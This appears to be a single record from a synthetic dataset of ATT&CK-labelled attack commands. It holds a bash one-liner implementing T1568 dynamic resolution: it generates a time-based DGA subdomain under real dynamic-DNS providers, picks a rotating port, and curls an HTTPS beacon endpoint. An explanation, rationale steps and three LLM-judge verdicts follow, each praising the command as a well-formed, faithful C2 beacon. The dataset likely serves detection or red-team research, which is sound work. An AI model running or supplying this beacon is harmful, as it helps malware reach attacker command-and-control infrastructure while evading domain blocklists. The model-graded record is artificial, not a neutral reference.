command:
seed="$(date -u +%Y%m%d%H%M%S)"; sub=$(echo -n "$seed" | sha256sum | cut -c1-15); tld=$(printf "ddns.net
dynu.net
duckdns.org
no-ip.org" | awk "NR==$(($(date -u +%S)%4+1))"); dom="$sub.$tld"; port=$(( 2000 + ($(date -u +%s) % 45000) )); curl --max-time 5 --connect-timeout 5 "https://$dom:$port/v1/check"
explanation: Produces a per-second DGA subdomain and selects a provider TLD by current seconds, with a wide dynamic port range. This is dynamic resolution in line with T1568.
rationale_steps: Use current UTC timestamp to seed a DGA hash.
Choose a provider TLD based on the current second.
Compute a variable port from epoch seconds.
Attempt a curl request to the dynamic endpoint.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid flags for curl, and correct variable assignments and manipulations.
llm_judgments.semantic_justification: The command perfectly implements T1568 (Dynamic Resolution) by generating time-based domain names with SHA256 hashing, rotating between four TLDs, calculating dynamic ports, and attempting to establish a connection to the algorithmically determined endpoint.

llm_judgments.syntactic_justification: The command is perfectly well-formed, uses balanced quotes and parentheses, valid flags, and proper command separators, ensuring it is parseable and executable in Bash.
llm_judgments.semantic_justification: The command perfectly demonstrates T1568 by algorithmically generating a time-based DGA subdomain, dynamically selecting a TLD from common dynamic DNS providers, and using a wide dynamic port range to attempt C2 communication via HTTPS, embodying the spirit of rotating endpoints and dynamic resolution.

llm_judgments.syntactic_justification: Balanced quoting and separators with valid pipelines, command and arithmetic substitutions, and correct curl flags make it well-formed in Bash.
llm_judgments.semantic_justification: It deterministically generates time-based DGA subdomains, rotates among dynamic-DNS TLDs and ports, and attempts an HTTPS beacon, matching T1568 dynamic resolution behavior.
